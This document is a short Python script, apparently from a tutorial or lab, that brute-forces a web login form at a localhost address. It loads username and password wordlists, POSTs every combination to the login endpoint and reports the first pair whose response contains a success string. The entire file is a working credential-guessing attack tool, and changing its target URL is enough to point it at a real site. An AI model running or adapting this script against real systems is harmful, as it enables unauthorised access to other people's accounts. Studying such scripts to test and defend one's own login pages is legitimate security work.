import requests
import sys

# 1. Setup our target and data sources
TARGET_URL = "http://127.0.0.1:5000/login"
SUCCESS_INDICATOR = "Access Granted!"

def load_words(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

def start_attack():
    usernames = load_words('users.txt')
    passwords = load_words('passwords.txt')
    
    print(f"[*] Starting attack on {TARGET_URL}...")
    
    # 2. The Brute-Force Logic (Nested Loops)
    for user in usernames:
        for pwd in passwords:
            print(f"[*] Trying Username: '{user}' | Password: '{pwd}'")
            
            # 3. Crafting the HTTP POST Request
            payload = {
                'username': user,
                'password': pwd
            }
            
            response = requests.post(TARGET_URL, data=payload)
            
            # 4. Analyzing the Response
            if SUCCESS_INDICATOR in response.text:
                print(f"\n[+] SUCCESS! Valid credentials found:")
                print(f"[+] Username: {user}")
                print(f"[+] Password: {pwd}")
                sys.exit(0) # Stop the script once found
                
    print("\n[-] Attack finished. No valid credentials found.")

if __name__ == '__main__':
    start_attack()
